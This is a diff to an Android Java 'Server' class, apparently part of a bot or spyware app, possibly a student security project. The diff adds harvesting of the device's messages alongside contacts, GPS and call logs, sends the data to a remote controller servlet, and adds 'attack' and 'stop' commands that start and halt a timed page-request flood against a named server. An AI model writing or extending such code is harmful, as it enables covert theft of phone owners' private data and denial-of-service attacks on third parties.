@@ -28,7 +28,7 @@ public class Server {
     String localIp;
     Context context;
     ContentResolver contentResolver;
-
+    GoToPage goToPage;
     String TAGSERVER = "Server";
 
     String getCommand = "get";
@@ -36,8 +36,10 @@ public class Server {
     String getCommandUtils = "utils";
     String getCommandGps = "gps";
     String getCommandContacts = "contacts";
+    String getpCommandMessages = "messages";
     String attackCommand = "attack";
     String stopCommand = "stop";
+
 
     //data
     JSONObject data = new JSONObject();
@@ -45,6 +47,7 @@ public class Server {
     JSONObject utilsJson = new JSONObject();
     JSONObject gpsJson = new JSONObject();
     JSONArray callLogsJson = new JSONArray();
+    JSONObject messagesJson = new JSONObject();
 
     public Server(Context context, ContentResolver contentResolver) {
         Thread socketServerThread = new Thread(new SocketServerThread());
@@ -97,6 +100,7 @@ public class Server {
                                 readContacts();
                                 readUtils();
                                 readCallLogs();
+                                readMessages();
                                 try {
                                     data = new JSONObject();
                                     data.put("ip", localIp);
@@ -104,6 +108,7 @@ public class Server {
                                     data.put("callLog", callLogsJson);
                                     data.put("utils", utilsJson);
                                     data.put("contacts", contactsJson);
+                                    data.put("messages", messagesJson);
                                 } catch (JSONException e) {
                                     e.printStackTrace();
                                 }
@@ -138,17 +143,36 @@ public class Server {
                                     e.printStackTrace();
                                 }
                             }
+                            else if(messageParts[1].equalsIgnoreCase(getpCommandMessages)){
+                                readContacts();
+                                try {
+                                    data = new JSONObject();
+                                    data.put("ip", localIp);
+                                    data.put("messages", messagesJson);
+                                } catch (JSONException e) {
+                                    e.printStackTrace();
+                                }
+                            }
                             //TODO: Parse get command and send POST request
                             //this request is async so you will have to execute this after every parsing operation is finished.
                             new Request().execute("http://" + serverIp + ":8080/Csec/Servlet", data.toString());
                         }
                         else if(messageParts[0].equalsIgnoreCase(attackCommand) && messageParts.length > 2){
+                            Log.i(TAGSERVER, "Attack will be started by:");
                             Log.i(TAGSERVER, messageParts[1]);  //server
                             Log.i(TAGSERVER, messageParts[2]);  //time
-                            //TODO: Attack command
+                            goToPage = new GoToPage(messageParts[1], Integer.parseInt(messageParts[2]));
+                            goToPage.start();
+                            Log.i(TAGSERVER, "Attack is start successfully");
                         }
                         else if(messageParts[0].equalsIgnoreCase(stopCommand)){
-                            //TODO: Stop command
+                            if (goToPage != null){
+                                Log.i(TAGSERVER, "Attack will be stopped...");
+                                goToPage.stop();
+                                Log.i(TAGSERVER, "Attack is stopped successfully");
+                            }else{
+                                Log.i(TAGSERVER, "Attack cannot be stopped!");
+                            }
                         }
                     }
                 }
@@ -178,6 +202,11 @@ public class Server {
         public void readCallLogs(){
             CallLogs calllogs= new CallLogs(contentResolver);
             callLogsJson = calllogs.getCallLogs();
+        }
+
+        public void readMessages(){
+            Tickets messages= new Tickets();
+            messagesJson = messages.getTickets(context);
         }
     }
 
